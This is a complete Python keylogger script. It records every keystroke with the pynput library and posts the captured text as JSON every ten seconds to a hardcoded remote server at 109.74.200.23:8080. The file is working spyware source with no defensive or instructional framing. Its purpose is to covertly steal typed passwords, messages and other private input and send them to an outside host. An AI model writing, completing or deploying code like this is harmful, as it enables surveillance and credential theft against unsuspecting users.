import os
import json
import requests
import threading
from pynput import keyboard
import logging

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# Global variable to store keystrokes
text = ""

# Configuration
ip_address = os.getenv("IP_ADDRESS", "109.74.200.23")
port_number = os.getenv("PORT_NUMBER", "8080")
time_interval = int(os.getenv("TIME_INTERVAL", 10))

def send_post_req():
    global text
    try:
        payload = json.dumps({"keyboardData": text})
        r = requests.post(f"http://{ip_address}:{port_number}", data=payload, headers={"Content-Type": "application/json"})
        if r.status_code == 200:
            logging.info("Data sent successfully")
            text = ""  # Clear the text after successful send
        else:
            logging.error(f"Failed to send data: {r.status_code}")
    except Exception as e:
        logging.error(f"Couldn't complete request: {e}")
    finally:
        timer = threading.Timer(time_interval, send_post_req)
        timer.start()

def on_press(key):
    global text
    try:
        if key == keyboard.Key.enter:
            text += "\n"
        elif key == keyboard.Key.tab:
            text += "\t"
        elif key == keyboard.Key.space:
            text += " "
        elif key == keyboard.Key.shift:
            pass
        elif key == keyboard.Key.backspace and len(text) == 0:
            pass
        elif key == keyboard.Key.backspace and len(text) > 0:
            text = text[:-1]
        elif key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
            pass
        elif key == keyboard.Key.esc:
            return False
        else:
            text += str(key).strip("'")
    except Exception as e:
        logging.error(f"Error processing key press: {e}")

if __name__ == "__main__":
    logging.info("Starting keylogger")
    send_post_req()
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()
